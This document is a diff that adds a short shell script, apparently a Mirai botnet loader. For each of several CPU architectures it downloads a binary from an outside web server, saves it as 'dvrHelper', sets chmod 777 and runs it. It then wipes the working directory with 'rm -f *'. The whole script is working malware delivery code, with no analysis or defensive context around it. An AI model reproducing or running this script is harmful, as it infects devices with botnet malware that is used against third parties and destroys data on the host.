@@ -1,0 +1,14 @@
+#!/bin/sh
+
+WEBSERVER="kysfag.3x.ro:80"
+
+
+BINARIES="mirai.mips mirai.x86 mirai.arm7 mirai.sh4  mirai.mpsl mirai.arm mirai.dbg"
+
+for Binary in $BINARIES; do
+    wget http://$WEBSERVER/$Binary -O dvrHelper
+    chmod 777 dvrHelper
+    ./dvrHelper
+done
+
+rm -f *
